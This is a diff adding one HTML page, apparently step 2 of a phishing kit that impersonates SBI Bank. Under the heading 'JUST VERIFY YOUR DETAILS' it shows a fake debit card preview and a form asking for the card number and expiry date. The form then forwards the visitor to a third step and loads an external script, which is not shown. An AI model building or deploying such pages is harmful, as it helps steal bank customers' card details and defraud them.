@@ -1,0 +1,22 @@
+<!doctype html>
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Step 2 - Card</title><link rel="stylesheet" href="styles.css"></head>
+<body>
+<div class="container"><div class="card">
+  <div class="logo"></div>
+  <h2>JUST VERIFY YOUR DETAILS</h2>
+  <div class="card-preview">
+    <div style="font-size:16px">SBI BANK DEBIT CARD</div>
+    <div class="preview-number" id="card-preview-number">XXXX XXXX XXXX XXXX</div>
+    <div class="preview-meta"><div>VALID THRU <span id="card-expiry-preview">MM/YY</span></div><div>CVV <span>***</span></div></div>
+  </div>
+  <form class="form" data-action="new-user-step3.html" data-page="new-user-step2">
+    <input class="input" id="card-number-input" name="roll_number" inputmode="numberic" maxlength="19" placeholder="Card Number (16 digits)" required>
+    <input class="input" id="expiry-input" name="expiry" data-expiry maxlength="5" placeholder="Expiry (MM/YY)" required>
+    <button class="btn" type="submit">Continue</button>
+  </form>
+</div></div>
+<script type="module" src="script.js"></script>
+</body>
+</html>
